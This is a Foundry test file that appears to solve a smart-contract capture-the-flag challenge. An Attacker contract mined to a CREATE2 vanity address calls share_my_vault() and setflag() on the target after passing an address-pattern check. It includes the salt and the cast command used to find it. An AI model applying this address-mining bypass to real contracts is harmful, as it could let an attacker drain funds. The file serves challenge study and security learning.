// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Existing} from "../src/Exist.sol";

contract Attacker {
    constructor(address target) {
        target.call(abi.encodeWithSignature("share_my_vault()"));
        target.call(abi.encodeWithSignature("setflag()"));
    }
}

contract ExistsTest is Test {
    Existing internal target;

    address internal constant DEPLOYER =
        0x67701d7aDAAF344C688691A4D06dE90e692Aa616;
    address internal constant TARGET_ADDRESS =
        0xf553a0215bFEa04f275cF672236F01AF8B58E09f;

    address internal constant EXPECTED_ADDRESS =
        0x7A27a4b7a03d7cbe90e697125091Ce26721c5A54;
    uint256 internal constant SALT =
        547591670255724782167808295792917447116945009250788384934440867126860335381;

    bytes20 internal appearance = bytes20(bytes32("ZT")) >> 144;
    bytes20 internal maskcode = bytes20(uint160(0xffff));

    function setUp() public {
        target = new Existing();
    }

    function getBytecode() public view returns (bytes memory) {
        bytes memory bytecode = type(Attacker).creationCode;

        return abi.encodePacked(bytecode, abi.encode(address(TARGET_ADDRESS)));
    }

    function getAddress(
        bytes memory bytecode,
        uint256 salt
    ) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), DEPLOYER, salt, keccak256(bytecode))
        );

        return address(uint160(uint(hash)));
    }

    function deploy(bytes memory bytecode, uint _salt) public payable {
        address addr;

        /*
        NOTE: How to call create2

        create2(v, p, n, s)
        create new contract with code at memory p to p + n
        and send v wei
        and return the new address
        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))
              s = big-endian 256-bit value
        */
        assembly {
            addr := create2(
                callvalue(), // wei sent with current call
                // Actual code starts after skipping the first 32 bytes
                add(bytecode, 0x20),
                mload(bytecode), // Load the size of code contained in the first 32 bytes
                _salt // Salt from function arguments
            )

            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }

        console.log(addr);
    }

    function test_hack() public {
        // assertEq(expectedBytecode, getBytecode());

        vm.prank(DEPLOYER);
        Attacker attacker = new Attacker{salt: bytes32(SALT)}(TARGET_ADDRESS);

        console.log(address(attacker));

        assertTrue(target.is_my_family(EXPECTED_ADDRESS), "is family");

        // console.logBytes20(maskcode); // code
        // console.logBytes20(appearance); // feature
        // Attacker attacker = create2
    }
}

// cast create2 --deployer 0x67701d7aDAAF344C688691A4D06dE90e692Aa616 -e 5a54 --init-code 0x608060405234801561001057600080fd5b506040516101e83803806101e883398101604081905261002f9161013c565b60408051600481526024810182526020810180516001600160e01b031663a3442ead60e01b17905290516001600160a01b0383169161006d9161016c565b6000604051808303816000865af19150503d80600081146100aa576040519150601f19603f3d011682016040523d82523d6000602084013e6100af565b606091505b505060408051600481526024810182526020810180516001600160e01b03166314191d4560e21b17905290516001600160a01b03841692506100f1919061016c565b6000604051808303816000865af19150503d806000811461012e576040519150601f19603f3d011682016040523d82523d6000602084013e610133565b606091505b5050505061019b565b60006020828403121561014e57600080fd5b81516001600160a01b038116811461016557600080fd5b9392505050565b6000825160005b8181101561018d5760208186018101518583015201610173565b506000920191825250919050565b603f806101a96000396000f3fe6080604052600080fdfea26469706673582212205cc53c02785ac5a13747a1ccb44f9ed745b662c143a2fce8e2455a9d1318677764736f6c63430008130033000000000000000000000000f553a0215bfea04f275cf672236f01af8b58e09f
